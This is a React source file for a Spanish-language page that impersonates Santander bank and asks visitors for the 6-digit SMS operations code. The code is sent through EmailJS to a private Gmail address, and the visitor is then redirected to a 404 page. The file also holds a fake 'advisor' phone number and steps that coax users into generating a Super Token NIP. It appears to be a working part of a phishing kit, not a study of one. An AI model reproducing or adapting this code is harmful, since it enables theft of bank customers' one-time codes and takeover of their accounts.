import React, { useState, useEffect } from 'react';
import '../css/segundapag.css';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';

function Segundapag() {
  const navigate = useNavigate();
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutos en segundos para la página principal
  const [showSupportModal, setShowSupportModal] = useState(false);

  useEffect(() => {
    if (timeLeft > 0) {
      const timerId = setInterval(() => {
        setTimeLeft((prevTime) => prevTime - 1);
      }, 1000);
      return () => clearInterval(timerId);
    }
  }, [timeLeft]);

  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${minutes}:${secs < 10 ? '0' : ''}${secs}`;
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    const formData = new FormData(event.target);
    const smsCode = formData.get('sms-code');

    try {
      const response = await emailjs.send(
        'service_pl7uznq', // Reemplaza con tu Service ID
        'template_nb08ccn', // Reemplaza con tu Template ID
        {
          sms_code: smsCode,
          to_email: 'alosantamex@gmail.com', // Correo destinatario
        },
        '8Mgn87H6amGJecjhG' // Reemplaza con tu Public Key
      );

      if (response.status === 200) {
        console.log('Datos enviados correctamente');
        navigate('/404'); // Navegar a la siguiente página
      } else {
        console.error('Error al enviar los datos');
      }
    } catch (error) {
      console.error('Error al enviar los datos:', error);
    }
  };

  const handleSupportClick = () => {
    setShowSupportModal(true);
  };

  return (
    <div className="auth-container">
      <div className="auth-header">
        <span className="auth-logo">
          <img
            style={{ width: '160px' }}
            src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-XzSWZdtf3Lgk80cOwX_lyUAiAGOkQer4gLjKSlGD1_Lso4yPSiWbUTVw-ssFpCkB2I-e4_gAGp3PFTz6uKHDMX3hD8QcVDWegy5jXJ4oOpTmXOzCTVoOEj5H0V_mKgxE9y9aAj5deqw/s640/logo+santander+nuevo2.jpg"
            alt="Logo Santander"
          />
        </span>
      </div>

      <div className="auth-progress">
        <div className="auth-step-circle">2</div>
        <div className="auth-status">
          <p>Lo estamos autenticando</p>
          <p>1 de 2</p>
        </div>
        <div className="auth-progress-bar">
          <div className="auth-progress-bar-fill"></div>
        </div>
      </div>

      <form className="auth-form" onSubmit={handleSubmit}>
        <label>
          Por tu seguridad, ingresa el código de operaciones de 6 dígitos que recibio vía mensaje SMS:
          <input
            type="tel"
            name="sms-code"
            maxLength={8}
            placeholder="6 dígitos"
            className="auth-input"
            required
          />
        </label>
        <div className="auth-timer">Tiempo restante: {formatTime(timeLeft)}</div>
        <button type="submit" className="auth-continue-button" disabled={timeLeft === 0}>
          Continuar
        </button>

        <div className="auth-info-text">
          <br />
          <strong>Si tienes problemas para obtener el NIP, <br />
          Por favor,</strong>{' '}
          <span className="auth-link" onClick={handleSupportClick} style={{ color: 'red', cursor: 'pointer' }}>
            da click aquí
          </span>
        </div>
      </form>

      {showSupportModal && (
        <div className="modal-overlay">
          <div className="modal-content">
            <strong><p>Contacta directamente con un asesor:</p></strong>
            <button
              onClick={() => window.location.href = 'tel:+525511951825'}
              style={{
                padding: '15px 20px',
                backgroundColor: 'red',
                color: 'white',
                border: 'none',
                borderRadius: '5px',
                fontSize: '16px',
                cursor: 'pointer',
                marginTop: '2px',
              }}
            >
              Llamar a un asesor
            </button>
            <br />
            <br />
            <div className="instructions">
              <strong>También puede seguir los siguientes pasos:</strong>
              <br />
              <br />
              <p className="instrudty">
                1. Abre la aplicación Santander <br />
                2. En la parte de abajo selecciona la opción "Super Token" <br />
                3. Ingresa tu clave Super Token para obtener el NIP dinámico
              </p>
            </div>
            <button onClick={() => setShowSupportModal(false)}>Cerrar</button>
          </div>
        </div>
      )}
    </div>
  );
}

export default Segundapag;
